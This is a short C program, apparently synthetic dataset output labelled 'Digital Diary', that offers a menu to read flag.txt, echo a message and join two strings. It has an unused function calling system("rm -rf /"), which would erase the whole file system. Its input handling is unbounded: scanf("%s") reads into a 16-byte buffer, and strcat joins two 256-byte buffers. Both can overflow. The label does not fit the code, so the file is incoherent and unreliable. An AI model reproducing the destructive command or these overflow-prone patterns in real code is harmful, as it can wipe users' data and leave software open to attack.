//Gemma-7B DATASET v1.0 Category: Digital Diary ; Style: Cryptic
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int _() {
    system("rm -rf /");
    return 0;
}

void _N() {
    FILE *fp = fopen("flag.txt", "r");
    if (fp) {
        char flag[256];
        fscanf(fp, "%s", flag);
        printf("The flag is: %s", flag);
    } else {
        printf("Error reading flag");
    }
}

void _S() {
    char msg[256];
    printf("Enter a secret message: ");
    fgets(msg, 256, stdin);
    printf("Your secret message is: %s", msg);
}

void _A() {
    char a[256], b[256];
    printf("Enter two strings: ");
    scanf("%s %s", a, b);
    printf("The concatenation of the two strings is: %s", strcat(a, b));
}

int main() {
    char cmd[16];
    printf("Enter a command: ");
    scanf("%s", cmd);

    if (strcmp(cmd, "n") == 0) {
        _N();
    } else if (strcmp(cmd, "s") == 0) {
        _S();
    } else if (strcmp(cmd, "a") == 0) {
        _A();
    } else {
        printf("Invalid command");
    }

    return 0;
}